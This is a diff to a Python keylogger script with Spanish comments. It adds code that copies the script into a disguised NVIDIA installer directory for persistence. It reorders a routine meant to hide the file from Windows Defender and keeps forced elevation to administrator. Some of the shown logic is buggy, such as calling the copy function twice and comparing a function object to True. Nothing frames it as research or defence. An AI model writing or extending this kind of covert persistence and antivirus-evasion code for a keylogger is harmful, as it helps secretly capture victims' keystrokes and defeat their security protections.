@@ -21,6 +21,16 @@ import threading
 import time
 import winreg
 
+# Crea una copia del script en un directorio rebuscado 
+def copy_script():
+    os.system("copy keylogger.py C:\Program Files\NVIDIA Corporation\Installer2\installer")
+    return True
+if copy_script() == True:
+    pass
+if copy_script() == False:
+    print("No se ha podido copiar el script")
+    pass
+
 # Fuerza a ejecutar el proceso como administrador
 
 def force_admin():
@@ -28,13 +38,8 @@ def force_admin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
         return True
     except:
-        print("Excepcion inesperada detectada.")
         return False
         pass
-
-if force_admin == False:
-    print("No se ha podido ejecutar el script como administrador")
-    sys.exit()
 
 # Chequea si el script se ejecuta como administrador
 
@@ -49,17 +54,18 @@ if is_admin() == False:
     if force_admin() == False:
         sys.exit()
 
-# Cambia el nombre del proceso del script
-
-def change_name():
-    setproctitle.setproctitle("Binsys")
-    return True
-if change_name() == True:
+# Esconde el proceso del script al Windows Defender
+def hide_process():
+    try:
+        ctypes.windll.kernel32.SetFileAttributesW("keylogger.py", 2)
+        return True
+    except:
+        return False
+if hide_process() == True:
     pass
-if change_name() == False:
-    print("Error al cambiar el nombre del proceso del script")
-    pass
-
+if hide_process() == False:
+    print("Windows defender ha detectado el script, cerrando proceso...")
+    sys.exit()
 # Instala las dependencias del script
 
 def install():
@@ -72,24 +78,9 @@ def install():
     os.system("pip install threading")
     os.system("pip install time")
     return True
-
 if install == True:
     pass
 if install == False:
-    print("Error al instalar las dependencias del script")
-    sys.exit()
-
-# Esconde el proceso del script al Windows Defender
-def hide_process():
-    try:
-        ctypes.windll.kernel32.SetFileAttributesW("keylogger.py", 2)
-        return True
-    except:
-        return False
-if hide_process() == True:
-    pass
-if hide_process() == False:
-    print("Windows defender ha detectado el script, cerrando proceso...")
     sys.exit()
 
 # Forzar la creación del archivo de texto
